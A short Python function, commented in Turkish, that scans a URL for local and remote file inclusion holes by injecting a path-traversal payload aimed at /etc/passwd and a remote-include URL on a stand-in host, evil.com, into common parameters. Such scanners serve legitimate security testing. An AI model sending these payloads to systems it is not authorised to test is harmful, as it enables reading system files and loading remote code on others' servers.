import requests

def check_lfi_rfi(url):
    test_params = [
        "page", "file", "path", "folder", "document", "include", "template"
    ]
    payloads = [
        "../../etc/passwd",                    # LFI
        "http://evil.com/malicious.txt"       # RFI (Bu test sadece izin verilmişse etkili olur)
    ]

    vulnerable = []

    for param in test_params:
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            try:
                response = requests.get(test_url, timeout=5)
                if "root:x:0:0:" in response.text:
                    return {
                        "status": "vulnerable",
                        "explanation": f"LFI açığı tespit edildi. Parametre: {param}"
                    }
                if "malicious" in response.text or "evil" in response.text:
                    return {
                        "status": "vulnerable",
                        "explanation": f"RFI açığı tespit edildi. Parametre: {param}"
                    }
            except requests.RequestException:
                continue

    return {
        "status": "safe",
        "explanation": "LFI veya RFI açığı tespit edilmedi."
    }
